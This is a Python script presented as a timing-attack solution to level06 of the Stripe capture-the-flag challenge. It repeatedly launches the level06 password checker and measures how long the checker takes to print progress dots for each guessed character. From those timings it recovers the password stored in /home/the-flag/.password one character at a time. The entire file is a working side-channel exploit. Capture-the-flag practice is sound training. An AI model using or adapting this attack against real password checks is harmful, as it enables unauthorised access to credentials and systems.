# -*- coding: utf-8 -*-

import argparse
import subprocess
import sys
import time
from operator import itemgetter


def stdout_write(string):
	"""
	Writes to and flushes stdout.
	
	Keyword arguments:
	string -- String. The string to write.
	
	"""
	sys.stdout.write(string)
	sys.stdout.flush()
	
	return None


def is_correct(password):
	"""
	Returns True if the supplied password is correct.
	
	Keyword arguments:
	password -- String. The password.
	
	"""
	test = subprocess.Popen([PROCESS, PASSWORD_FILE, password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	stdout, stderr = test.communicate()
	
	if (stdout != 'Ha ha, your password is incorrect!\n'):
		return True
	
	return False


def first_unique_local_maximum_of_derivative(data):
	"""
	Returns the index as an int of the first unique local maximum of the derivative of a list of data.
	
	Keyword arguments:
	data -- List. Numerical data.
	
	"""
	first_unique_local_maximum_index = 1
	last_delta = 0
	
	for i in range(1, len(data) - 1):
		current_delta = data[i] - data[i - 1]
		
		if current_delta >= last_delta:
			first_unique_local_maximum_index += 1
			last_delta = current_delta
		else:
			break
	
	return first_unique_local_maximum_index


def trial(guesses):
	"""
	Returns the index as an int of the first local maximum in an list of data.
	
	Keyword arguments:
	guesses -- List. Characters to try.
	
	"""
	guess_times = dict((character, 0.0) for character in guesses)
	for character in guesses:
		for trial in range(TRIALS):
			guess_times[character] += character_time(character)
	
	guess_times = sorted(guess_times.items(), key=itemgetter(1), reverse=False)
	
	partition = first_unique_local_maximum_of_derivative([guess_times[i][1] for i in range(0, len(guess_times) - 1)])
	
	return [guess_times[i][0] for i in range(partition)]


def character_time(character):
	"""
	Returns the time as a float taken for the password checker to process the supplied character.
	
	Keyword arguments:
	character -- String. The character to check.
	
	"""
	check_dot = len(password) + 1
	
	test = subprocess.Popen([PROCESS, PASSWORD_FILE, password + character + '&'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	
	test.stderr.read(33) # Throw out "Welcome to the password checker!"
	
	start_time = 0.0
	end_time = 0.0
	
	while test.stderr.read(1) != '':
		if check_dot == 1:
			start_time = time.time()
		
		elif check_dot == 0:
			end_time = time.time()
			break
		
		check_dot -= 1
	
	return end_time - start_time


if __name__ == '__main__':
	parser = argparse.ArgumentParser(description="A timing attack designed to crack the password of the Stripe CTF's level06.", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
	parser.add_argument('process', help="The path to level06.", default="/levels/level06", nargs='?')
	parser.add_argument('password_file', help="The path to the password file.", default="/home/the-flag/.password", nargs='?')
	parser.add_argument('-c', '--characters', help="A string of possible characters to check.", default="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0213456789")
	parser.add_argument('-t', '--trials', help="The number of trials to run. More trials improve accuracy at the expense of speed.", default=2, type=int)
	
	arguments = parser.parse_args()
	
	CHARACTERS, PASSWORD_FILE, PROCESS, TRIALS = arguments.characters, arguments.password_file, arguments.process, arguments.trials
	
	try: # Make sure PROCESS is pointing to some copy of level06.
		open(PROCESS)
		process = subprocess.Popen([PROCESS, PASSWORD_FILE, ''], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		assert process.stderr.read(32) == "Welcome to the password checker!"
	except IOError:
		print "Couldn't access %s. Are you sure that's the right path?" % PROCESS
		sys.exit(1)
	except AssertionError:
		print "%s doesn't seem to be a copy of level06. Are you sure that's the right path?" % PROCESS
		sys.exit(1)
	
	
	password = ""
	
	while not is_correct(password):
		guesses = trial(CHARACTERS)
		
		while len(guesses) > 1:
			guesses = list(set(trial(guesses)) & set(trial(guesses)))
		
		if len(guesses) > 0:
			password += guesses[0]
			
			stdout_write(guesses[0])
	
	stdout_write('\n')
